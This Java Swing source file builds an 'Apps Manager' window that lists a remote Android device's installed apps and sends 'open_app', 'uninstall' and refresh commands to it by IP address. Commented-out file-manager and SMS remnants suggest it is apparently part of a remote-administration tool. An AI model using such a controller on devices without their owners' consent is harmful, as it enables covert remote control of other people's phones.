package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.RenderingHints;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.Base64;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class Android_Apps_Manager {

	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem uninstallapp;
    private  JMenuItem run_app;
    private  JMenuItem run_app_ref;
 
    private  String File_Seperator ="x";
    private  int Upload_Chunk = 0;
    private  int there_but_notsent=0;
    private  boolean exit_unstable = false;
	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
	private  JTextArea Dir ;
	private  String grab="False";
	private  String File_Sep = ""; 
	private  String YY="";
	public Android_Apps_Manager(String ip){
		this.sock = ip;
	
	}
	public JTextArea get_DIR(){
		return Dir;
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public void Set_File_Sep(String s){
		File_Sep = s;
	}
	public String Get_sock(){
		return sock ;
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	 private Image getScaledImage(Image srcImg, int w, int h){
		    BufferedImage resizedImg = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
		    Graphics2D g2 = resizedImg.createGraphics();

		    g2.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
		    g2.drawImage(srcImg, 0, 0, w, h, null);
		    g2.dispose();

		    return resizedImg;
		}
	public void yourAddRow(String str0,String str1, String str2, String str3,String str4 ) throws IOException{
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
	 
		  byte[] btDataFile =  Base64.getDecoder().decode(str0);
		  BufferedImage image = ImageIO.read(new ByteArrayInputStream(btDataFile));
			   ImageIcon icon=new ImageIcon(image);
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4});
				  
				  
				  
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			  
			// setColumnWidths(j,0);
		 //IP is 2nd column
		   
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	
	 public  void Do_frame(){
		 if(form==null){
		 form = new JFrame();
		 }form.setName("Apps Manager For : " + sock);
		 form.setTitle("Apps Manager For : " + sock);
		 title = "Apps Manager For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		  
			 
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			JPopupMenu popupMenu = new JPopupMenu();
		     uninstallapp = new JMenuItem("Uninstall App");  
		     run_app = new JMenuItem("Run App");
		     run_app_ref = new JMenuItem("Refresh");
		 
			uninstallapp.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "delete icon.png" )));
			run_app.setIcon(new ImageIcon(Master.class.getResource("processicon.png" )));
			run_app_ref.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" +"refresh.png" )));
			run_app_ref.setForeground(Color.WHITE);
			uninstallapp.setForeground(Color.WHITE);
			run_app.setForeground(Color.WHITE);
			
			uninstallapp.setBackground(new Color(0, 64, 128));
			 
			run_app.setBackground(new Color(0, 64, 128));
			run_app_ref.setBackground(new Color(0, 64, 128));
 
			popupMenu.add(run_app_ref);
			popupMenu.add(run_app);
			popupMenu.add(uninstallapp);
		 
			
		    Object[] columnNames = {"^.^","Name", "PKG NAME", "Installed By","Date"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	      	 
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
			
	        j.setGridColor(new Color(0, 64, 128));
			   j.setBackground(new Color(0, 64, 128) );
			   j.setOpaque(true);
			   j.setFillsViewportHeight(true);
			   j.setForeground(Color.WHITE);
	        j.addMouseListener(new MouseAdapter() {
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	            	   /*
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                  
	                  if (item_type.contains("Folder")||item_type.contains("Drive")){
	                 
	                	  
	                		 if(item_type.contains("null D") || Dir.getText().contains("/")){
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + "/");  
			                	  Dir.repaint();
	                		 }else{
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + (File_Sep).charAt(0) );  
			                	  Dir.repaint();
	                		 }
		                	
		                	 // System.out.print("here enter command : " + Dir.getText());
		                	  get_row_index(); //clear jtable
		                	  System.out.println("iam          " + sock );
		                	  sock = title.replace("File Manager For : "  , "");
		                	 // new MessageBox().infoBox("iam " + sock, "");
		                	 // Master.Send_Data("file_manager" + Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);
		                 
	                	  
	                 }
	                  */
	                  
	               }
	            }
	         });
	        
	        
	     
	        run_app.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  					int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
						 
						Master.Send_Data("open_app"  +  Exe_Split+  selected_item    +  Exe_Split  , sock,true);
	  				 /*if (JOptionPane.showConfirmDialog(form, 
	 			            "Are you sure you want to Delete Selected Item ?", "Close Window?", 
	 			            JOptionPane.YES_NO_OPTION,
	 			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
	  					int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("delete"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split  , sock,false);
	 			        }*/	 
	  				
	  				
	  					
	  		         
	  				}
	  			});

	        run_app_ref.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  			 
						Master.Send_Data("applications"  +  Exe_Split  , sock,true);
	  				 /*if (JOptionPane.showConfirmDialog(form, 
	 			            "Are you sure you want to Delete Selected Item ?", "Close Window?", 
	 			            JOptionPane.YES_NO_OPTION,
	 			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
	  					int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("delete"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split  , sock,false);
	 			        }*/	 
	  				
	  				
	  					
	  		         
	  				}
	  			});
	  			
	        
	        
	        uninstallapp.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					
			
					
					 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to Uninstall Selected App ?", "Uninstall App?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
				
						 
							int selectedRow = j.getSelectedRow();
							String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
							Master.Send_Data("uninstall"  +  Exe_Split+  selected_item    +  Exe_Split  , sock,true);
			        } 
					
					
					/*//do here some stuff
					 * 
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("execute"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split + Exe_Ending , sock,false);
		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		        		*/
		         
				}
			}); 
	    
	        
	        
			Dir.setFont(font);
			Dir.setEditable(false);
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			   
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close Apps Manager "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			    	     Master.Remove_Form_AppsManager_Android(sock);
			    	 	form.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
			        }else{
			        	form.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
			        	
			        }
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		    
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        sp.setComponentPopupMenu(popupMenu);
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		    
		      // Buttons.add(Dir);
		    
		  
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT,sp,Buttons );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(420);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(420 );
				        	Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			
	}
	
	private void remo_row(String str1,String str2){
		 DefaultTableModel Model = (DefaultTableModel) j.getModel();
		 for(int row = 0;row < Model.getRowCount();row++) {
			  for(int col = 0;col < Model.getColumnCount();col++) {
				 
		 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
		 	    		//  new MessageBox().infoBox(str1, str2);
		 	    		 Model.removeRow(row);
		 	    		 j.revalidate();
		 	    	}
		 	      }
		 	}
	}
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}//    Object[] columnNames = {"^.^","Number", "NAME / Contact", "Date","SMS Content"}; 
	public void Add_AppS(String iconbuffer, String appname,String pkgname,String InstalledBy , String Date){
		 
		 try {
			yourAddRow(iconbuffer,appname,pkgname,InstalledBy,Date);
			 j.repaint();
			 
		     sp.updateUI();
		     sp.repaint();
			 form.repaint();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	 
}
